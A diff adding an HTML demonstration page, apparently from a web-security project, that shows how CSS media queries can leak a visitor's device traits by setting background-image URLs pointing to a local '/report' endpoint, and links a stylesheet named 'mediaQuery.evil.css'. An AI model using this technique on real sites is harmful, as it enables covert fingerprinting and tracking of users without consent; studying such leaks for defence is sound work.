@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+    <title>Media Query</title>
+    <link rel="stylesheet" href="http://localhost:3000/mediaQuery.evil.css"/>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            font-family: "Courier New", sans-serif;
+        }
+
+        .content {
+            text-align: left;
+            width: 800px;
+            margin: 0 auto;
+        }
+
+        .title {
+            margin-top: 40px;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+<div class="title">Use media query to steal user's device information</div>
+<pre class="content" id="content"></pre>
+<script>
+    document.getElementById("content").innerText = `
+    Example Code:
+
+    @media ... {
+        some-dom {
+            background-image: url("http://localhost:3000/report?...");
+        }
+    }
+
+    * Only a few element use background-image attribute, so we need many dom which can
+    set background-image to extract more device information
+    `
+</script>
+<div id="dom-any-hover" class="dom-for-css">DOM for any-hover</div>
+<div id="dom-display-mode" class="dom-for-css">DOM for display-mode</div>
+<div id="dom-orientation" class="dom-for-css">DOM for orientation</div>
+
+
+</body>
+</html>
